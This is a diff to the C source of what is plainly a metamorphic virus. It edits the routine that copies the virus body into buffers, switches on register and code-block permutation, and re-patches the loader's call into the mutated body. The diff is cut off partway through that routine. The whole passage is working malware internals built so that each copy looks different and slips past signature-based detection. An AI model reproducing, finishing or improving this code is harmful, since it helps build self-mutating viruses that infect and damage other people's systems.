@@ -21,6 +21,7 @@
 #include "syscall.h"
 #include "log.h"
 #include "write_jump.h"
+#include "utils.h"
 
 /*
 ** metamorph_self is a metamorphic generator for the virus and loader.
@@ -35,12 +36,12 @@ static bool	setup_input_buffer(struct safe_ptr *input, void *clone_virus, \
 			size_t virus_size)
 {
 	*input = (struct safe_ptr){
-		.ptr  = sys_mmap(0, virus_size, PROT_READ | PROT_WRITE, // TODO
+		.ptr  = sys_mmap(0, virus_size, PROT_READ | PROT_WRITE,
 			MAP_ANON | MAP_PRIVATE, -1, 0),
 		.size = virus_size
 	};
 
-	if (input->ptr == NULL) return errors(ERR_SYS, _ERR_MMAP_FAILED);
+	if (input->ptr < 0) return errors(ERR_SYS, _ERR_MMAP_FAILED);
 
 	memcpy(input->ptr, clone_virus, virus_size);
 
@@ -48,18 +49,18 @@ static bool	setup_input_buffer(struct safe_ptr *input, void *clone_virus, \
 }
 
 static bool	setup_output_buffer(struct safe_ptr *output, void *clone_virus, \
-			size_t clone_size, size_t loader_size)
+			size_t available_size)
 {
 	*output = (struct safe_ptr){
 		.ptr  = clone_virus,
-		.size = clone_size - loader_size
+		.size = available_size
 	};
 
 	return true;
 }
 
 static bool	get_input_virus_address(struct safe_ptr clone, size_t loader_off, \
-			void *clone_virus, void *input_virus, size_t *input_virus_address)
+			void *clone_virus, void *input_virus, void **input_virus_address)
 {
 	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
 	size_t	off_vircall = loader_off + dist_loader_entry_vircall;
@@ -68,9 +69,10 @@ static bool	get_input_virus_address(struct safe_ptr clone, size_t loader_off, \
 	if (clone_call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
 	int32_t	*clone_call_arg = (clone_call_code + 1);
-	void	*new_clone_virus = (void*)((ssize_t)(clone_call_code + 5) + *clone_call_arg);
+	void	*virus_func_addr = (void*)((clone_call_code + 5) + *clone_call_arg);
 
-	*input_virus_address = (size_t)input_virus + (new_clone_virus - clone_virus);
+	size_t	virus_func_off_in_virus = virus_func_addr - clone_virus;
+	*input_virus_address = input_virus + virus_func_off_in_virus;
 
 	return true;
 }
@@ -108,17 +110,13 @@ bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, \
 
 	struct safe_ptr	input_buffer;
 	struct safe_ptr	output_buffer;
-	size_t		input_virus_address;
+	void		*input_virus_address;
 	int32_t		virus_func_shift = 0;
 
-	if (!setup_input_buffer(&input_buffer, clone_virus, *virus_size)
-	||  !setup_output_buffer(&output_buffer, clone_virus, clone.size, loader_size)
-	||  !get_input_virus_address(clone, loader_off, clone_virus, input_buffer.ptr, &input_virus_address))
-		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
-
-	// metamorph self and client
-	if (!true
-	// || !permutate_registers(clone_loader, seed, loader_size)
+	if (!setup_input_buffer(&input_buffer, clone_virus, *virus_size)// TODO free on err
+	|| !setup_output_buffer(&output_buffer, clone_virus, clone.size - virus_entry_off)
+	|| !get_input_virus_address(clone, loader_off, clone_virus, input_buffer.ptr, &input_virus_address)
+	|| !permutate_registers(clone_loader, seed, loader_size)
 	|| !permutate_blocks(input_buffer, output_buffer, virus_size, input_virus_address, &virus_func_shift, seed)
 	|| !adapt_virus_call_in_loader(clone, loader_off, virus_func_shift)
 	|| !free_accessor(&input_buffer)
